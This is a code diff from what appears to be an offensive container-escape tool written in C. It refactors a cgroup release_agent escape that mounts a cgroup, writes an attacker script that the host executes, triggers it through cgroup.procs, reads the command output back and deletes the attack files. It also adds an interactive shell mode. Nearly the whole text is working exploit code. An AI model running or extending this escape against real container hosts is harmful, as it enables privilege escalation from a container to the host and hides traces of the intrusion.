@@ -35,21 +35,25 @@ int clear_cgroup_procs(void *args) {
     strcpy(cgroup_procs_args->cgroup_procs_path, arg->cgroup_procs_path);
 
     sprintf(pid, "%d", getpid());
-
-    printf_wrapper(INFO, "Echo pid: %s to %s and this pid of process will close soon\n", pid,
-                   cgroup_procs_args->cgroup_procs_path);
+    if (attack_info.attack_mode != SHELL) {
+        printf_wrapper(INFO, "Echo pid: %s to %s and this pid of process will close soon\n", pid,
+                       cgroup_procs_args->cgroup_procs_path);
+    }
 
     fd = open(cgroup_procs_args->cgroup_procs_path, O_WRONLY);
     write(fd, pid, strlen(pid));
     close(fd);
 }
 
-void clear_all(char *output_path_in_container, char *controller_path, char *cgroup_mount_path, char *exp_path) {
-    int remove_controller_path_ret = remove_dir(controller_path);
-    int umount_cgroup_ret = umount(cgroup_mount_path);
-    int remove_cgroup_mount_path_ret = remove_dir(cgroup_mount_path);
-    int remove_exp_path_ret = remove_file(exp_path);
-    int remove_output_path_in_container_ret = remove_file(output_path_in_container);
+void clear_all() {
+    int remove_controller_path_ret = remove_dir(release_agent_attack_info.controller_path);
+    int umount_cgroup_ret = umount(release_agent_attack_info.mount_path);
+    int remove_cgroup_mount_path_ret = remove_dir(release_agent_attack_info.mount_path);
+    int remove_exp_path_ret = remove_file(release_agent_attack_info.exp_path);
+    int remove_output_path_in_container_ret = 0;
+    if (release_agent_attack_info.output_path_in_container != NULL && attack_info.attack_mode != SHELL) {
+        remove_output_path_in_container_ret = remove_file(release_agent_attack_info.output_path_in_container);
+    }
     if (remove_controller_path_ret != 0 || remove_cgroup_mount_path_ret != 0 || remove_exp_path_ret != 0 ||
         remove_output_path_in_container_ret != 0 || umount_cgroup_ret != 0) {
         printf_wrapper(ERROR, "Failed to clear attack related file\n");
@@ -58,7 +62,13 @@ void clear_all(char *output_path_in_container, char *controller_path, char *cgro
     }
 }
 
-void exec(char *exp_path, char *cmd, char *container_path_in_host, char *controller_path, char *cgroup_mount_path) {
+void release_agent_exec() {
+
+    if (attack_info.attack_mode == SHELL && strcmp(attack_info.command, "quit") == 0) {
+        clear_all();
+        return;
+    }
+
     int fd;
     int output_path_random_length = 5;
     char *output_path_random = malloc(output_path_random_length + 1);
@@ -66,43 +76,60 @@ void exec(char *exp_path, char *cmd, char *container_path_in_host, char *control
     rand_string(output_path_random, output_path_random_length);
     char exp[2048] = "#!/bin/sh\n";
     char cgroup_procs_path[256];
-    fd = open(exp_path, (O_CREAT | O_WRONLY | O_TRUNC));
-    strcat(exp, cmd);
+    fd = open(release_agent_attack_info.exp_path, (O_CREAT | O_WRONLY | O_TRUNC));
+    strcat(exp, attack_info.command);
     strcat(exp, " > ");
-    strcat(exp, container_path_in_host);
+    strcat(exp, release_agent_attack_info.container_path_in_host);
     strcat(exp, "/tmp/");
     strcat(exp, output_path_random);
 
     strcpy(output_path_in_container, "/tmp/");
     strcat(output_path_in_container, output_path_random);
+
+    release_agent_attack_info.output_path_in_container = (char *) malloc(512 * sizeof(char));
+    strcpy(release_agent_attack_info.output_path_in_container, output_path_in_container);
+
     write(fd, exp, strlen(exp));
     close(fd);
 
-    strcpy(cgroup_procs_path, controller_path);
+    int exp_mode = S_IRUSR | S_IWUSR | S_IXUSR | S_IXGRP | S_IXOTH;
+    chmod(release_agent_attack_info.exp_path, exp_mode);
+
+    strcpy(cgroup_procs_path, release_agent_attack_info.controller_path);
     strcat(cgroup_procs_path, "/cgroup.procs");
 
     struct cgroup_procs_clone_args args;
     args.cgroup_procs_path = cgroup_procs_path;
     void *arg = (void *) &args;
     clone(clear_cgroup_procs, malloc(STACK_SIZE) + STACK_SIZE, SIGCLD, arg);
-
-    printf_wrapper(INFO, "Waiting for the command execution is completed (2s)\n");
-    sleep(2);
+    if (attack_info.attack_mode != SHELL) {
+        printf_wrapper(INFO, "Waiting for the command execution is completed (2s)\n");
+    }
+    sleep(1);
 
     struct stat s;
-    stat(output_path_in_container, &s);
+    stat(release_agent_attack_info.output_path_in_container, &s);
     char *exec_command_result_buffer = malloc(s.st_size * sizeof(char));
-    fd = open(output_path_in_container, O_RDONLY);
+    memset(exec_command_result_buffer, 0x00, s.st_size);
+    fd = open(release_agent_attack_info.output_path_in_container, O_RDONLY);
     read(fd, exec_command_result_buffer, s.st_size);
-    printf_wrapper(INFO, "Command execution results are as follows: \n");
-    printf("%s\n", exec_command_result_buffer);
+    if (attack_info.attack_mode != SHELL) {
+        printf_wrapper(INFO, "Command execution results are as follows: \n");
+    }
+    if (exec_command_result_buffer[strlen(exec_command_result_buffer) - 1] != '\n') {
+        printf("%s\n", exec_command_result_buffer);
+    } else {
+        printf("%s", exec_command_result_buffer);
+    }
     close(fd);
 
-    clear_all(output_path_in_container, controller_path, cgroup_mount_path, exp_path);
-}
+    if (attack_info.attack_mode == EXEC) {
+        clear_all();
+    }
 
-void shell() {
-
+    if(attack_info.attack_mode == SHELL) {
+        remove_file(release_agent_attack_info.output_path_in_container);
+    }
 }
 
 void reverse() {
@@ -110,7 +137,7 @@ void reverse() {
 }
 
 
-int escape_by_release_agent(char *container_path_in_host) {
+int escape_by_release_agent() {
     printf_wrapper(INFO, "Start escape by release_agent\n");
     const int cgroup_path_random_length = 10;
     const int controller_path_random_length = 5;
@@ -137,6 +164,9 @@ int escape_by_release_agent(char *container_path_in_host) {
         perror("mount failed");
     }
 
+    release_agent_attack_info.mount_path = (char *) malloc(512 * sizeof(char));
+    strcpy(release_agent_attack_info.mount_path, mount_path);
+
     // create child cgroup
     char *controller_path_random = malloc(controller_path_random_length + 1);
     rand_string(controller_path_random, controller_path_random_length);
@@ -147,6 +177,8 @@ int escape_by_release_agent(char *container_path_in_host) {
     if (stat(controller_path, &st) == -1) {
         mkdir(controller_path, 0777);
     }
+    release_agent_attack_info.controller_path = (char *) malloc(512 * sizeof(char));
+    strcpy(release_agent_attack_info.controller_path, controller_path);
 
     //enable notify_on_release
     strcpy(notify_on_release_path, controller_path);
@@ -166,7 +198,7 @@ int escape_by_release_agent(char *container_path_in_host) {
 
     char *release_agent_exp_path_random = malloc(release_agent_exp_path_length + 1);
     rand_string(release_agent_exp_path_random, release_agent_exp_path_length);
-    strcpy(release_agent_exp_path, container_path_in_host);
+    strcpy(release_agent_exp_path, release_agent_attack_info.container_path_in_host);
     strcat(release_agent_exp_path, "/tmp/");
     strcat(release_agent_exp_path, release_agent_exp_path_random);
     printf_wrapper(INFO, "Write exp_path to release_agent: %s\n", release_agent_exp_path);
@@ -179,12 +211,8 @@ int escape_by_release_agent(char *container_path_in_host) {
 
     //
     strcat(exp_path, release_agent_exp_path_random);
-    printf_wrapper(INFO,"Exp path: %s\n", exp_path);
+    printf_wrapper(INFO, "Exp path: %s\n", exp_path);
 
-    // rwx--x--x
-    int exp_mode = S_IRUSR | S_IWUSR | S_IXUSR | S_IXGRP | S_IXOTH;
-    chmod(exp_path, exp_mode);
-    if (attack_info.attack_mode == EXEC) {
-        exec(exp_path, attack_info.command, container_path_in_host, controller_path, mount_path);
-    }
+    release_agent_attack_info.exp_path = (char *) malloc(512 * sizeof(char));
+    strcpy(release_agent_attack_info.exp_path, exp_path);
 }
